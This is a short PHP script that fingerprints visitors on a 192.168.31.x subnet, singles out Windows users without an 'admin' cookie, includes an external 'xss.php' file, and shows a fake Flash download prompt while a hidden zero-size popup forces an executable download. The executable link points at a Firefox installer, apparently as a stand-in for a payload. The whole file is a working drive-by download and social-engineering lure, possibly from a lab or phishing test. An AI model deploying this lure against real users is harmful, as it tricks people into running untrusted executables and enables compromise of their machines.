<?php
$clientip = $_SERVER['REMOTE_ADDR'];
echo $clientip;
echo "<br>";
$ip_start = get_iplong('192.168.31.1');
$ip_end = get_iplong('192.168.31.255');
$ip = get_iplong($clientip);

if($ip>=$ip_start && $ip <=$ip_end)
{
	$agent = $_SERVER['HTTP_USER_AGENT'];
	echo "$agent";
	echo "<br>";
	if(preg_match('/Windows NT/',$agent))
	{
		$os = "Windows";
		if ($os == "Windows")
		{
			//$cookiess = $_COOKIE["user"];
			if (isset($_COOKIE["admin"]))
			{
				echo "<br>";
			}
			else
			{				
				include './xss.php';
				echo "<br />";
				echo "<h1>if don't downlaod,please downloads file:</h1>";
				echo "<p>";
				echo "<a href='https://download-ssl.firefox.com.cn/releases-sha2/stub/official/zh-CN/Firefox-latest.exe' ><p>Flash     downloads     file</p></a>";
				echo '<script type=text/javascript>window.open("https://download-ssl.firefox.com.cn/releases-sha2/stub/official/zh-CN/Firefox-latest.exe","name1","width=0,height=0,toolbar=no,scrollbars=no,menubar=no,screenX=100,screenY=100");</script>';
				exit;
			}
		}
	}
	

}
function get_iplong($ip)
{

    return bindec(decbin(ip2long($ip)));
}

?>



